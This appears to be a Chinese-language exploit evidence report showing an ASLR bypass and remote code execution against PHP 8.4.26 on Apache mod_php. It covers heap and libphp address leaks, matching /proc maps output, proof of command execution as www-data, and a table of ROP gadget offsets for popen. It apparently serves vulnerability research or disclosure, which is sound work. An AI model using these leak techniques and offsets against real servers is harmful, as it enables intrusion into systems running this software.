# ASLR 绕过证据（PHP 8.4.26 / Apache mod_php）

## 环境

```text
personality = 00000000   # ASLR 开启
Apache 2.4.68 prefork, 单 worker
PHP 8.4.26 (source build, libphp.so)
```

## 泄漏 1：Zend MM chunk base

`/leak.php` 返回 929 字节，其中 `s:775:"` 后 775 字节包含堆指针。

ASLR 实测：

```text
first ptrs: 0x7fd3e62013a0, 0x7fd3e62013c0, ...
masked bases: 0x7fd3e6200000 (48 pointers)
```

`/proc/<child>/maps`：

```text
7fd3e6200000-7fd3e6400000 rw-p 00000000 00:00 0
```

两者一致（2MB 对齐的 Zend MM chunk）。

## 泄漏 2：libphp base

`/leak_libc.php?mode=file_first` 返回 32815 字节，其中 `s:32768:"` 后 32768 字节是受控长度 OOB 读。

ASLR 实测：

```text
payload offset 0x1fe8 = 0x7fd3e7fb6309
libphp_base = 0x7fd3e7fb6309 - 0x5b6309 = 0x7fd3e7a00000
```

`/proc/<child>/maps`：

```text
7fd3e7a00000-7fd3e7b4f000 r--p 00000000 ... /usr/lib/apache2/modules/libphp.so
```

完全一致。

## 完整 ASLR 利用

当前 master（personality=0）：

```text
anchor 0x7f17fe3b6309 hb 0x7f17fc600000 lb 0x7f17fde00000 S 0x7f17fc603780
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
（连续 3/3）
```

重启全新 Apache master：

```text
anchor 0x7fd3e7fb6309 hb 0x7fd3e6200000 lb 0x7fd3e7a00000 S 0x7fd3e6203780
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
（连续 2/2）
```

## 关键公式/偏移（本构建）

| 项 | 值 |
|---|---|
| heap chunk base | `mode(leaked_ptr & ~0x1fffff)` |
| libphp base | `qword(payload[0x1fe8]) - 0x5b6309` |
| 利用请求的 S | `chunk_base + 0x3780` |
| `leave; ret` | libphp + `0x21ef23` |
| `pop rdi; ret` | libphp + `0x15e492` |
| `pop rsi; ret` | libphp + `0x15d1a3` |
| `ret`（对齐） | libphp + `0x15a029` |
| `popen@plt` | libphp + `0x1504d0` |
| `exit@plt` | libphp + `0x155780` |

## 脚本

- `tools/leak.php`
- `tools/leak_libc.php`
- `tools/dyn_payload.php`
- `tools/aslr_run2.py`

## 备注

- 默认 `session.serialize_handler=php` 已修复 GH-16590；泄漏使用 `php_serialize` 兄弟路径（8.4.26 仍存在）。
- `S_OFF=0x3780` 是对“两次泄漏请求之后、`dyn_payload.php` 请求”的实测值；换请求顺序/脚本需重新校准。
- 同一 Apache master 下 worker 重建后 hb/lb 不变（prefork 继承映射）；master 重启后变化，泄漏自动适配。
